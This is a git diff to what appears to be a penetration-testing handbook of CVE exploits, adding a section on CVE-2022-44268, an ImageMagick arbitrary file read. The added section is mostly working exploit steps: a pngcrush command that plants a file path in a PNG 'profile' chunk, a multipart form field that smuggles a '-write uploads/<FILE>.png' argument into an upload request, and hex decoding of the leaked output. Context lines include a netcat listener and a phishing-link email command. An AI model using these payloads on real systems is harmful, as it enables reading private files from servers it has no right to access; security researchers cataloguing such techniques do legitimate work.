@@ -15,6 +15,7 @@
 - [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-0847-Dirty-Pipe-LPE)
 - [CVE-2022-22963: Spring4Shell RCE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-22963-Spring4Shell-RCE-0-day)
 - [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-30190-MS-MSDT-Follina-RCE)
+- [CVE-2022-44268: ImageMagick Arbitrary File Read PoC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC)
 - [CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21716-Microsoft-Word-RTF-Font-Table-Heap-Corruption-RCE-PoC-Python-Implementation)
 - [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-21746-Windows-NTLM-EoP-LocalPotato-LPE)
 - [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass)
@@ -96,6 +97,7 @@
 | CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
 | CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
 | CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
+| CVE-2022-44268 | ImageMagick Arbitrary File Read PoC | https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC |
 | CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
 | CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
 | CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
@@ -485,6 +487,29 @@ $ nc -lnvp <LPORT>
 ```c
 $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 ```
+
+## CVE-2022-44268: ImageMagick Arbitrary File Read PoC
+
+> https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC
+
+```c
+$ sudo apt-get install pngcrush imagemagick exiftool exiv2
+```
+
+```c
+$ pngcrush -text a "profile" "<FILE>" <FILE.png
+```
+
+```c
+-----------------------------299057355710558143811161967686
+Content-Disposition: form-data; name="srcFormat"
+
+png:- -write uploads/<FILE>.png
+```
+
+### Decoding Output
+
+> https://cyberchef.org/#recipe=From_Hex(%27Auto%27)
 
 ## CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)
 
